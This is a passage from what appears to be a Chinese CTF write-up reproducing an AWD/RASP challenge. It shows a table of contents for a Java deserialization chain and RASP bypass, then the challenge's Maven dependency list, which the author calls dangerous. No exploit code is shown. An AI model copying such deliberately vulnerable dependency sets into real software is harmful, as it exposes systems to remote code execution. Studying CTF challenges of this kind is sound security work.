                <a href="http://localhost:1313/about/" title="关于">
                    <span>关于👨‍💻</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      强网拟态2025决赛awd_rasp复现
    </h1>
<div class="post-meta"><span title='2025-12-11 11:00:00 +0800 CST'>2025-12-11</span>&nbsp;·&nbsp;<span>6 分钟</span>&nbsp;·&nbsp;<span>Xrntkk</span>

<div class="meta-item">&nbsp·&nbsp
  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
  </div>      
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#sink-shellsession" aria-label="Sink: ShellSession">Sink: ShellSession</a></li>
                <li>
                    <a href="#source-hashtable" aria-label="Source: Hashtable">Source: Hashtable</a></li>
                <li>
                    <a href="#%e4%b8%ad%e9%97%b4%e9%93%be%e5%ad%90" aria-label="中间链子">中间链子</a></li>
                <li>
                    <a href="#rasp-bypass" aria-label="Rasp bypass">Rasp bypass</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>这是一个含有非常多危险依赖的题，如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="ln">  1</span><span class="cl"> <span class="nt">&lt;dependencies&gt;</span>
</span></span><span class="line"><span class="ln">  2</span><span class="cl">
</span></span><span class="line"><span class="ln">  3</span><span class="cl">        <span class="c">&lt;!-- AOP / Aspect --&gt;</span>
</span></span><span class="line"><span class="ln">  4</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">  5</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.glassfish.hk2.external<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">  6</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>aopalliance-repackaged<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">  7</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.6.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">  8</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">  9</span><span class="cl">
</span></span><span class="line"><span class="ln"> 10</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 11</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.aspectj<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln"> 12</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>aspectjweaver<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln"> 13</span><span class="cl">            <span class="nt">&lt;version&gt;</span>1.9.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln"> 14</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 15</span><span class="cl">
</span></span><span class="line"><span class="ln"> 16</span><span class="cl">        <span class="c">&lt;!-- Oracle Coherence --&gt;</span>
</span></span><span class="line"><span class="ln"> 17</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 18</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>com.oracle.coherence.ce<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln"> 19</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>coherence<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln"> 20</span><span class="cl">            <span class="nt">&lt;version&gt;</span>14.1.1-0-3<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln"> 21</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 22</span><span class="cl">
</span></span><span class="line"><span class="ln"> 23</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 24</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>com.oracle.coherence.ce<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln"> 25</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>coherence-rest<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln"> 26</span><span class="cl">            <span class="nt">&lt;version&gt;</span>14.1.1-0-3<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln"> 27</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 28</span><span class="cl">
</span></span><span class="line"><span class="ln"> 29</span><span class="cl">        <span class="c">&lt;!-- Commons --&gt;</span>
</span></span><span class="line"><span class="ln"> 30</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 31</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>commons-beanutils<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln"> 32</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>commons-beanutils<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln"> 33</span><span class="cl">            <span class="nt">&lt;version&gt;</span>1.9.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln"> 34</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 35</span><span class="cl">
</span></span><span class="line"><span class="ln"> 36</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 37</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>commons-collections<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln"> 38</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>commons-collections<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln"> 39</span><span class="cl">            <span class="nt">&lt;version&gt;</span>3.2.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln"> 40</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 41</span><span class="cl">
</span></span><span class="line"><span class="ln"> 42</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 43</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.apache.commons<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln"> 44</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>commons-collections4<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln"> 45</span><span class="cl">            <span class="nt">&lt;version&gt;</span>4.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln"> 46</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 47</span><span class="cl">
</span></span><span class="line"><span class="ln"> 48</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 49</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>commons-logging<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln"> 50</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>commons-logging<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln"> 51</span><span class="cl">            <span class="nt">&lt;version&gt;</span>1.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln"> 52</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 53</span><span class="cl">
</span></span><span class="line"><span class="ln"> 54</span><span class="cl">        <span class="c">&lt;!-- Groovy --&gt;</span>
</span></span><span class="line"><span class="ln"> 55</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 56</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.codehaus.groovy<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln"> 57</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>groovy<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln"> 58</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.3.9<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln"> 59</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 60</span><span class="cl">
</span></span><span class="line"><span class="ln"> 61</span><span class="cl">        <span class="c">&lt;!-- HK2 --&gt;</span>
</span></span><span class="line"><span class="ln"> 62</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 63</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.glassfish.hk2<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln"> 64</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>hk2-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln"> 65</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.6.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln"> 66</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 67</span><span class="cl">
</span></span><span class="line"><span class="ln"> 68</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 69</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.glassfish.hk2<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln"> 70</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>hk2-locator<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln"> 71</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.6.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln"> 72</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 73</span><span class="cl">
</span></span><span class="line"><span class="ln"> 74</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 75</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.glassfish.hk2<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln"> 76</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>hk2-utils<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln"> 77</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.6.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln"> 78</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 79</span><span class="cl">
</span></span><span class="line"><span class="ln"> 80</span><span class="cl">        <span class="c">&lt;!-- Jackson --&gt;</span>
</span></span><span class="line"><span class="ln"> 81</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 82</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln"> 83</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jackson-annotations<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln"> 84</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.13.4<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln"> 85</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 86</span><span class="cl">
</span></span><span class="line"><span class="ln"> 87</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 88</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln"> 89</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jackson-core<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln"> 90</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.13.4<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln"> 91</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 92</span><span class="cl">
</span></span><span class="line"><span class="ln"> 93</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 94</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln"> 95</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jackson-databind<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln"> 96</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.13.4.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln"> 97</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln"> 98</span><span class="cl">
</span></span><span class="line"><span class="ln"> 99</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">100</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.datatype<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">101</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jackson-datatype-jdk8<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">102</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.13.4<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">103</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">104</span><span class="cl">
</span></span><span class="line"><span class="ln">105</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">106</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.datatype<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">107</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jackson-datatype-jsr310<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">108</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.13.4<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">109</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">110</span><span class="cl">
</span></span><span class="line"><span class="ln">111</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">112</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.jaxrs<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">113</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jackson-jaxrs-base<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">114</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.13.4<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">115</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">116</span><span class="cl">
</span></span><span class="line"><span class="ln">117</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">118</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.jaxrs<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">119</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jackson-jaxrs-json-provider<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">120</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.13.4<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">121</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">122</span><span class="cl">
</span></span><span class="line"><span class="ln">123</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">124</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.module<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">125</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jackson-module-jaxb-annotations<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">126</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.13.4<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">127</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">128</span><span class="cl">
</span></span><span class="line"><span class="ln">129</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">130</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.module<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">131</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jackson-module-parameter-names<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">132</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.13.4<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">133</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">134</span><span class="cl">
</span></span><span class="line"><span class="ln">135</span><span class="cl">        <span class="c">&lt;!-- Jakarta --&gt;</span>
</span></span><span class="line"><span class="ln">136</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">137</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>jakarta.activation<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">138</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jakarta.activation-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">139</span><span class="cl">            <span class="nt">&lt;version&gt;</span>1.2.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">140</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">141</span><span class="cl">
</span></span><span class="line"><span class="ln">142</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">143</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>jakarta.annotation<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">144</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jakarta.annotation-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">145</span><span class="cl">            <span class="nt">&lt;version&gt;</span>1.3.5<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">146</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">147</span><span class="cl">
</span></span><span class="line"><span class="ln">148</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">149</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>jakarta.validation<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">150</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jakarta.validation-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">151</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.0.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">152</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">153</span><span class="cl">
</span></span><span class="line"><span class="ln">154</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">155</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>jakarta.ws.rs<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">156</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jakarta.ws.rs-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">157</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.1.6<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">158</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">159</span><span class="cl">
</span></span><span class="line"><span class="ln">160</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">161</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>jakarta.xml.bind<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">162</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jakarta.xml.bind-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">163</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.3.3<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">164</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">165</span><span class="cl">
</span></span><span class="line"><span class="ln">166</span><span class="cl">        <span class="c">&lt;!-- Javassist --&gt;</span>
</span></span><span class="line"><span class="ln">167</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">168</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.javassist<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">169</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>javassist<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">170</span><span class="cl">            <span class="nt">&lt;version&gt;</span>3.25.0-GA<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">171</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">172</span><span class="cl">
</span></span><span class="line"><span class="ln">173</span><span class="cl">        <span class="c">&lt;!-- Jersey --&gt;</span>
</span></span><span class="line"><span class="ln">174</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">175</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.glassfish.jersey.core<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">176</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jersey-client<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">177</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.35<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">178</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">179</span><span class="cl">
</span></span><span class="line"><span class="ln">180</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">181</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.glassfish.jersey.core<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">182</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jersey-common<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">183</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.35<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">184</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">185</span><span class="cl">
</span></span><span class="line"><span class="ln">186</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">187</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.glassfish.jersey.containers<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">188</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jersey-container-jdk-http<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">189</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.35<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">190</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">191</span><span class="cl">
</span></span><span class="line"><span class="ln">192</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">193</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.glassfish.jersey.containers<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">194</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jersey-container-servlet<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">195</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.35<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">196</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">197</span><span class="cl">
</span></span><span class="line"><span class="ln">198</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">199</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.glassfish.jersey.containers<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">200</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jersey-container-servlet-core<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">201</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.35<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">202</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">203</span><span class="cl">
</span></span><span class="line"><span class="ln">204</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">205</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.glassfish.jersey.ext<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">206</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jersey-entity-filtering<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">207</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.35<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">208</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">209</span><span class="cl">
</span></span><span class="line"><span class="ln">210</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">211</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.glassfish.jersey.inject<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">212</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jersey-hk2<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">213</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.35<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">214</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">215</span><span class="cl">
</span></span><span class="line"><span class="ln">216</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">217</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.glassfish.jersey.media<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">218</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jersey-media-json-jackson<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">219</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.35<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">220</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">221</span><span class="cl">
</span></span><span class="line"><span class="ln">222</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">223</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.glassfish.jersey.media<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">224</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jersey-media-sse<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">225</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.35<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">226</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">227</span><span class="cl">
</span></span><span class="line"><span class="ln">228</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">229</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.glassfish.jersey.core<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">230</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jersey-server<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">231</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.35<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">232</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
